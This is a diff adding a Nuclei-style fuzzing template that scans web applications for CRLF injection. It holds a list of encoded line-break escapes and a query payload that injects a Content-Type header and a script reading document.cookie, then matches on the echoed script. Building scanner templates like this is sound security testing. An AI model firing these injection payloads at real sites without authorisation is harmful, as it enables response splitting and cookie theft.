@@ -1,0 +1,80 @@
+id: crlf-injection-fuzz
+
+info:
+  name: CRLF Injection
+  author: pdteam,reewardius
+  reference: https://twitter.com/ashabdelrazik/status/1671259253066317825
+  severity: low
+  tags: blind,fuzzing,crlf
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      escape:
+        - "%00"
+        - "%0a"
+        - "%0a%20"
+        - "%0d"
+        - "%0d%09"
+        - "%0d%0a"
+        - "%0d%0a%09"
+        - "%0d%0a%20"
+        - "%0d%20"
+        - "%20"
+        - "%20%0a"
+        - "%20%0d"
+        - "%20%0d%0a"
+        - "%23%0a"
+        - "%23%0a%20"
+        - "%23%0d"
+        - "%23%0d%0a"
+        - "%23%oa"
+        - "%25%30"
+        - "%25%30%61"
+        - "%2e%2e%2f%0d%0a"
+        - "%2f%2e%2e%0d%0a"
+        - "%2f..%0d%0a"
+        - "%3f"
+        - "%3f%0a"
+        - "%3f%0d"
+        - "%3f%0d%0a"
+        - "%e5%98%8a%e5%98%8d"
+        - "%e5%98%8a%e5%98%8d%0a"
+        - "%e5%98%8a%e5%98%8d%0d"
+        - "%e5%98%8a%e5%98%8d%0d%0a"
+        - "%e5%98%8a%e5%98%8d%e5%98%8a%e5%98%8d"
+        - "%u0000"
+        - "%u000a"
+        - "%u000d"
+        - "\r"
+        - "\r%20"
+        - "\r\n"
+        - "\r\n%20"
+        - "\r\n\t"
+        - "\r\t"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{escape}}%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html><script>alert(document.cookie)</script><!--"
+          
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<script>alert(document.cookie)</script>"
+          
+      - type: status
+        status:
+          - 200
+          - 302
+          - 301
+          - 400
+        condition: or
